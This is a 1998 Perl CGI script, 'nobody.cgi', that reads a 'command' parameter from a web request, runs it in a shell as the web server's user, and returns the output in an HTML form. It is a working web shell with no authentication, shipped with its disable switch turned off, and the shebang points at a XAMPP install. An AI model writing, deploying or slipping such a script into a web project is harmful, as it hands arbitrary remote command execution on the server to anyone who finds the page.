#!"C:\xampp\perl\bin\perl.exe"
# ---------------------------------------------------------------------------
# nobody.cgi v1.0 released 09/21/98
# Copyright (c) 1998 Jason M. Hinkle
# 
# Use this script to execute commands as user:nobody (or whatever account
# your web server runs under).  See http://www.verysimple.com/scripts/
# for instructions.
# 
# WARNING!!! Be sure to disable the script (see configuration variables)
# when not in use.  Do not make this script accessible to the public!
# By using this software you agree not to hold it's author responsible for
# any damages directly or indirectly caused by this software.  Use at your
# own risk.
# ---------------------------------------------------------------------------

##########################################################################
# CONFIGURATION VARIABLES

# Set $disable to 1 to disable the script, 0 to enable it.
    $disable = 0;

# $script_url is the URL to the script so that it can refer to itself.
# This can be left alone unless you rename the script or encounter 404
# errors when using the script.
    $script_url = "./nobody.cgi";

##########################################################################

# Check if the script has been disabled
if ($disable) {&output_html("The script has been disabled")};

# Parse Input
&read_parse();

# Execute command
$results = &execute_command;

# Output HTML
&output_html($results);



# ---------------------------------------------------------------------------
# read_parse v1.1
# Copyright (c) 1998 Jason M. Hinkle
# http://www.verysimple.com/scripts/
# Based on ReadParse v1.14, Copyright (c) 1995 Steven E. Brenner
# Reads in GET, POST or UNIX command line data
# 
# See configuration variable (below) to accept command line input.
# ---------------------------------------------------------------------------
sub read_parse {
  # check if an alternate name is use and localize variables
  local (*in) = @_ if @_;
  local ($i, $key, $val, $accept_command);

  # Global variables returned: $in{field_name}, $method

  # -----------------------------------------------------------------------
  # CONFIGURATION VARIABLE FOR READ_PARSE:
  # -----------------------------------------------------------------------
  # $accept_command = 1 (to accept command line input) or
  # $accept_command = 0 (to block command line input)
  $accept_command = 0;

  # set some global variables
  $method = $ENV{'REQUEST_METHOD'};
  $length  = $ENV{'CONTENT_LENGTH'};

  # determine the request method and read in the text
  
  # check to see if command line data was entered
  if (!defined $method || $method eq '') {
    if ($accept_command) {
        push(@in, @ARGV);
        $method = "COMMAND";  # also use command-line options
    } else {
        die("ERROR: Command line input not accepted\n")
    }
  
  # check to see if data was submitted via GET
  } elsif($method eq 'GET' || $method eq 'HEAD') {
    $in = $ENV{'QUERY_STRING'};
    @in = split(/[&;]/,$in);
  
  # check to see if data was submitted via POST
  } elsif ($method eq 'POST') {
    if (($got = read(STDIN, $in, $length) != $length)) {
      $errflag="Short Read: wanted $length, got $got\n"
    };
    @in = split(/[&;]/,$in);
  
  # otherwise, what the...?
  } else {
    $errflag="Unknown request method: $method\n";
  }

  # Change all the funky characters back to english and assign the variables
  foreach $i (0 .. $#in) {
    # Convert plus's to spaces
    $in[$i] =~ s/\+/ /g;

    # Split into key and value.
    ($key, $val) = split(/=/,$in[$i],2); # splits on the first =.

    # Convert %XX from hex numbers to alphanumeric
    $key =~ s/%(..)/pack("c",hex($1))/ge;
    $val =~ s/%(..)/pack("c",hex($1))/ge;

    # Associate key and value
    $in{$key} .= "\0" if (defined($in{$key})); # \0 is the multiple separator
    $in{$key} .= $val;

  }

  # return the variables using the array name given, or @in
  return scalar(@in);
}


# ---------------------------------------------------------------------------
# execute_command v0.1
# Copyright (c) 1998 Jason M. Hinkle
# http://www.verysimple.com/scripts/
# ---------------------------------------------------------------------------
sub execute_command {
    local(@output,$formated,$error);

    if ($in{command}) {
              
        # One method of sending a command:
        # open (SHELLPIPE,"$in{command}|");
        # @output = <SHELLPIPE>;
        # close (SHELLPIPE);

        # another method:
        @output = `$in{command}`;
    }

    foreach $output (@output) {
        $formated .= $output;
    }

    $formated = "This command produced no output\n" unless $formated;

    $formated .= "\n";
    $formated .= "--------------------------------------------------\n";
    $formated .= "------------- Diagnostic Info Below: -------------\n";
    $formated .= "--------------------------------------------------\n";
    $formated .= "Command:      " . $in{command} . "\n";
    $formated .= "User ID:      " . $> . "\n";
    $formated .= "Process ID:   " . $$ . "\n";
    $formated .= "Base Time:    " . $^T . "\n";
    $formated .= "Error Code:   " . $? . "\n";
    $formated .= "Warning Code: " . $^W . "\n";

    return($formated);
}


# ---------------------------------------------------------------------------
# output_html v1.0
# ---------------------------------------------------------------------------
sub output_html {
    local($message) = @_;

    # Output the HTML
    print "Content-type: text/html\n\n";
    print "<html>\n";
    print "<head>\n";
    print "<title>nobody.cgi 1.0</title>\n";
    print "</head>\n";
    print "<body bgcolor=\"#000000\" text=\"#FFFFFF\">\n";
    print "</font face=\"Courier\" size=\"2\">\n";

    print "<form>\n";
    print "<textarea name=\"results\" cols=\"70\" rows=\"15\" wrap=\"OFF\">\n";
    print "$message\n";
    print "</textarea>\n";
    print "</form>\n";
    print "<form action=\"$script_url\" method=\"POST\">\n";
    print "<input type=\"Text\" name=\"command\" size=\"60\">\n";
    print "<input type=\"Submit\" value=\"Execute\">\n";
    print "</form>\n";

    print "<font size=\"2\" face=\"arial, helvetica\">\n";
    print "<b>nobody.cgi \&copy; 1998 <a href=\"http://www.verysimple.com/scripts/\">VerySimple</a></b><br>\n";
    print "<a href=\"http://www.verysimple.com/scripts/nobody.html\">http://www.verysimple.com/scripts/nobody.html</a><br>\n";
    print "</font>\n";

    print "</font>\n";
    print "</body>\n";
    print "</html>\n";

    exit;
}